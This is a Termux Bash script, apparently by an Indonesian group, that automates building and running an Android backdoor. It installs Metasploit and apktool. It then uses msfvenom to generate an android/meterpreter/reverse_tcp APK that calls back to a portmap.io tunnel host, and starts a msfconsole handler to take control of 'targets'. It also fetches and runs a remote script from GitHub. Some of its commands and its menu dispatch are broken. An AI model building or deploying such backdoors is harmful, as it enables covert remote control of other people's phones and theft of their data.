#!/bin/bash
#export os,sys
#flush ()
#variable warna
#gunakan script ini dengan bijak
#created by Konpoi
#github : https://github.com/duocyberteam
#thanks to : E99, Gafar Rizky & Fadilah Ramadhan

merah="\033[31;1m"
hijau="\033[32;1m"
kuning="\033[33;1m"
biru="\033[34;1m"
ungu="\033[35;1m"
cyngga="\033[36;1m"
putih="\033[37;1m"

clear

awal(){
echo $cyngga
baner
sleep 0.01
echo
echo $cyngga "----------------------------《 MENU 》---------------------------"
sleep 0.01
echo
echo $hijau"< 1 >$kuning INSTALL BAHAN BAHAN YANG DIPERLUKAN"
sleep 0.01
echo $hijau"< 2 >$kuning BUAT BACKDOOR BARU"
sleep 0.01
echo $hijau"< 3 >$kuning EKSEKUSI TARGET"
sleep 0.01
echo $hijau"< 4 >$kuning LOCK SECURITY APK TERMUK KALIAN"
sleep 0.01
echo $hijau"< 5 >$kuning UPDATE SCRIPT"
sleep 0.01
echo $hijau"< 6 >$kuning VIDEO TUTORIAL(YOUTUBE)"
sleep 0.01
echo $hijau"< 7 >$kuning EXIT"
sleep 0.01
echo
echo
read -p "MASUKAN PILIHAN  : " pi
}

baner(){
echo $hijau """
          ___ ___   _____ _____  __  _  __ __  __ __^
          |   T   T / ___/|     ||  l/ ]|  T  T|  T  T
          | _   _ |(   \_ |   __j|  ' / |  |  ||  |  |
          |  \_/  | \__  T|  l_  |    \ |  |  ||  ~  |
          |   |   | /  \ ||   _] |     Y|  :  |l___, |
          |   |   | \    ||  T   |  .  |l     ||     !
          l___j___j  \___jl__j   l__j\_j \__,_jl____/

          ___  _  _ ____    ____ _   _ ___  ____ ____
          |  \ |  | |  |    |     \_/  |__] |___ |__/
          |__/ |__| |__|    |___   |   |__] |___ |  \

                     ___ ____ ____ _  _
                      |  |___ |__| |\/|
                      |  |___ |  | |  |

$putih "_________________________________________________________________"

$cyngga   "Author"           ":"          $cyngga "" Konpoi (Duocyberteam) ""
$cyngga   "Github"           ":"           $cyngga "https://github.com/duocyberteam"
$cyngga   "Youtube"          ":"           $cyngga "Duocyberteam Metasploit"
$cyngga   "Thanks to"        ":"           $cyngga "Gafar Risky"

$putih "_________________________________________________________________"
"""
sleep 0.01
}

satu(){
clear
echo
baner
echo
echo $hijau"<1>$kuning INSTALL METASPLOIT "
sleep 0.2
echo $hijau"<2>$kuning INSTALL APKTOOL & LAINNYA "
sleep 0.2
echo
read -p "MASUKAN PILIHAN : " pil
	echo
echo "input < $hijau back  > untuk ke menu awal"
}

msf_satu(){
echo
baner
echo
echo $cyngga "MEMERLUKAN WAKTU 30 MENIT SAMPAI 1 JAM"
echo $cyngga "SIAPKAN KOPINYA BIAR NUNGGUNYA GA BOSEN ,HEHE"
echo $cyngga "INSTALLING......"
sleep 0.2
echo
pkg update && upgrade
pkg install unstable-repo
termux-setup-storage
apt update && upgrade
apt install metasploit
sleep 0.1
clear
fungsi
}

bahan_dua(){
clear
echo
baner
echo
echo $cyngga "PENGINSTALLAN APKTOOL......."
echo $cyngga "Installing....."
echo
termux-setup-storage
apt update && apt upgrade -y
apt install git nano curl python python2 php ruby toilet figlet openssh clang -y
apt install -f -y
gem install lolcat
mkdir Malware
dpkg -i apktool.deb
echo
echo "----------------------------------------------------";
echo $hijau"[+]$ku installing sukses"
echo
sleep 5
clear
read -p "[+] enter untuk membuat akun portmap.io" y
xdg-open "https://portmap.io/"
read -p "[+] tekan enter untuk install openvpn" y
xdg-open "https://play.google.com/store/apps/details?id=net.openvpn.openvpn"
read -p "[+] tekan enter untuk install apksigner" y
xdg-open "https://play.google.com/store/apps/details?id=com.haibison.apksigner"
echo
clear
fungsi
}

ulang(){
ulang="s"
while [ $ulang = "s" ];
do
        sleep 0.02
done
}

dua(){
clear
echo
baner
echo
read -p "MASUKAN NAMA BACKDOOR :" nama
sleep 0.01
echo $ungu "_________________________________________________________"
echo
echo $cyngga "Masukan 5 digit angka portmap Kalian"
echo
echo $putih "testermetasploit-$hijau 46454$putih .portmap.io"
echo $cyngga "Contoh 5 digit angka saya (yg warna hijau)"
echo
read -p "Masukan 5 digit angka kalian : " lp
echo                                                                                    
echo $ungu "________________________________________________________"
echo
echo $putih "Masukan LHOST Kalian"
echo
echo $hijau "testermetasploit-46454.portmap.io"                                         
echo $cyngga "Contoh LHOST saya (teks diatas)"
echo
read -p "Masukan LHOST kalian : " lh
echo
clear
echo $hijau "MEMBUAT BACKDOOR .. PLEASE WAIT ...."
sleep 1
msfvenom -p "android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o /sdcard/$nama.apk"
sleep 0.1
am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity
sleep 0.1
clear
fungsi
}

tiga(){
clear
echo
baner
echo
echo $cyngga "HIDUPKAN OPEN VPN TERLEBIH DAHULU..."
am start --user 0 -n "net.openvpn.openvpn/net.openvpn.unified.MainActivity"
ifconfig
echo                                                                            
read -p "Masukan Iptun0 nya : " tun0
sleep 0.02
echo
clear
echo                                                                                    
echo $kuning "---------------------------------------------------"
echo
echo $putih "testermetasploit-46454.portmap.io =>$hijau 8080"
echo $cyngga "Contoh LPORT saya (5 digit angka yg warna hijau)"
echo
read -p "Masukan LPORT kalian : " lport;
echo
echo $ungu "EKSEKUSI . WAITING......"
sleep 0.1
msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $tun0;set LPORT $lport;exploit;"
sleep 0.1
clear
fungsi
}

empat(){
clear
cd
rm -fr msfkuy
git clone "http://github.com/duocyberteam/msfkuy"
sleep 0.01
cd msfkuy
sh msfkuy.sh
echo
clear
}

lima(){
echo $kuning  "    SUBSCRIBE , LIKE , COMENT . BANTU SUPPORT YAA    "
sleep 2
xdg-open "https://m.youtube.com/channel/UCD7oBtHBe7bbGi31BZwe0ZA"
clear
fungsi 
}

enam(){
baner
sleep 0.01
echo
echo
echo $hijau    "                TERIMAKASIH :)          "
echo
echo
echo $kuning "       Code By Konpoi (Duocyberteam) "
sleep 3
echo
cd  $(pwd)
cd
exit
}

satusatu(){
satu
echo
if [ $pil = "1" ];
then
clear                                                                                  
msf_satu

elif [ $pil = "2" ];
then
clear
bahan_dua

elif [ $pil = "back" ];
then
clear
fungsi

else
clear
echo $merah "MASUKAN INPUT YANG BENAR !"
sleep 2
clear
satusatu

fi
}

fungsi(){
loginfungsi
awal
if [ $pi = "1" ];
then
satusatu

elif [ $pi = "2" ];
then
clear
dua

elif [ $pi = "3" ];
then
clear
tiga

elif [ $pi = "4" ];
then
clear
empat

elif [ $pi = "5" ];
then
clear
lima

elif [ $pi = "6" ];
then
clear
enam

else
clear
echo $merah "MASUKAN INPUT YANG BENAR !"
sleep 3
clear
for i in ulang
do
      echo $fungsi
done
fungsi

fi
}

((fungsi))